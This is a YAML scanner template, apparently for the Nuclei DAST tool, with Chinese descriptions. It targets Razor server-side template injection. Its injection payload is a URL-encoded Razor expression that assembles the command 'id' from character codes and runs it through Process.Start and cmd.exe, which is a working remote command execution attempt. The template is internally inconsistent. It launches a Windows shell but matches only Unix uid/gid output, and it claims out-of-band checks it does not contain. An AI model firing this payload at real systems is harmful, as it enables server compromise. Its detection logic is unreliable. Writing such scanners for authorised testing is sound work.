id: razor-ssti

info:
  name: Razor 服务端模板注入（DAST）
  author: ritikchaddha
  severity: high
  description: |
    Razor 服务端模板注入发生在用户输入被当作模板语法执行时，攻击者可利用模板语言访问运行时对象或调用危险函数。模板注入 Razor 专用表达式，并通过 `id` 输出、`uid/gid` 正则或外带交互确认表达式在服务端执行。
  impact: |
    - 攻击者可能执行系统命令、读取敏感文件、访问应用上下文或窃取环境变量。
    - 模板引擎通常运行在 Web 应用权限下，成功利用可导致应用服务器失陷。
  remediation: |
    - 将用户输入作为普通数据绑定到模板变量，不允许用户控制模板源码或表达式。
    - 升级模板引擎，启用沙箱和最小权限运行环境，禁止危险类、函数和系统命令访问。
  reference:
    - https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
  metadata:
    max-request: 1
  tags: razor,ssti,dast,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'
          - 'method == "POST"'
          - 'method == "PUT"'
    payloads:
      injection:
        - "@{string+x%3Dnull%3Bint[]l%3D{105%2C100}%3Bforeach(int+c+in+l){x%2B%3D((char)c).ToString()%3B}%3B}@System.Diagnostics.Process.Start(%22cmd.exe%22%2C+%22/c+%22+x)"

    fuzzing:
      - parts:
          - query
          - body
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    matchers:
      - type: regex
        part: body
        regex:
          - "uid=[0-9]+.*gid=[0-9]+.*"
